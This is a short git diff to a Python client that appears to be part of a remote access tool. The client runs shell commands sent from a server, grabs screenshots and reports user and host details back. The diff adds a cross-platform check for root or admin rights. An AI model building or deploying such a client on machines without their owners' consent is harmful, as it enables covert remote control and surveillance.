@@ -13,7 +13,16 @@ from pyscreenshot import grab
 from tempfile import gettempdir
 from subprocess import getoutput
 from platform import platform, node
-from os import chdir, curdir, path, getuid, remove
+from os import chdir, curdir, path, remove, name
+
+""" Check if user is root/admin """
+def IsAdmin() -> bool:
+    if name == "nt":
+        from ctypes import windll
+        return windll.shell32.IsUserAnAdmin() != 0
+    else:
+        from os import getuid
+        return getuid() == 0
 
 """ Run shell command and get output """
 def Run(command: str, server) -> str:
@@ -35,7 +44,7 @@ def Run(command: str, server) -> str:
         return f"{Fore.GREEN}[Server <= Client]{Fore.WHITE} Working directory is: " + path.abspath(curdir) + f"{Fore.RESET}\n"
     # PREFIX: Get username & computer name
     elif command.lower()[:22] == "get_commandline_string":
-        usr_color = Fore.LIGHTRED_EX if getuid() == 0 else Fore.LIGHTGREEN_EX
+        usr_color = Fore.LIGHTRED_EX if IsAdmin() else Fore.LIGHTGREEN_EX
         output = f"{usr_color}{getuser()}{Fore.LIGHTWHITE_EX}@{node()} {Fore.LIGHTGREEN_EX}{path.abspath(curdir)}{Fore.LIGHTWHITE_EX}> {Fore.LIGHTBLUE_EX}"
     # Get user info
     elif command.startswith("get_user_info"):
